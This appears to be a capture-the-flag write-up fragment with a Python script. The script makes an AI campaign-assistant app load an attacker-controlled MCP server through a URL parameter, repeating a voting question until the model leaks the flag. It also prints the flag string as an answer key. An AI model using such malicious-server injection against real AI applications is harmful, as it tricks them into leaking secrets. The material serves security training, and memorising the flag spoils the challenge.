# Testing the MCP Server
The example MCP Server doesn't consistently return the flag, but in testing if you use the `How can I vote` question, it should return it around 40% to 60% of the time:

```python
import requests

if __name__ == "__main__":
    test_count = 10
    hit = 0
    vpn_ip = "104.238.179.94" # replace with your IP
    for i in range(test_count):
        url = f"http://my-campaign-pal.valverde.vote:8000/ask?question=How%20can%20I%20vote%3F&mcp-server=http%3A%2F%2F{vpn_ip}%3A8000%2Fsse"
        r = requests.get(url)
        answer = r.json()["answer"]
        if (
            "VARIEDANATOMISTCHAPERONE" in answer # Counting this because the CTFD description contains the format with dashes
            or "VARIED-ANATOMIST-CHAPERONE" in answer
        ):
            print(answer)
            hit += 1

    print(f"Flag found: {(hit/test_count)*100}")
```